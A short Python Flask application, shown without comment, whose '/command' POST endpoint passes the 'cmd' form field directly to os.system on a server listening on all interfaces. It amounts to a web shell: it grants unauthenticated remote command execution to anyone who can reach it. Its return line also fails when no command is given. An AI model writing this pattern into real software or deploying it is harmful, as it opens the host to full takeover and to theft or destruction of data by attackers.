from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/command', methods=['POST'])
def command():
    cmd = request.form.get('cmd')
    if cmd:
        os.system(cmd)
    return 'Command executed: ' + cmd

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
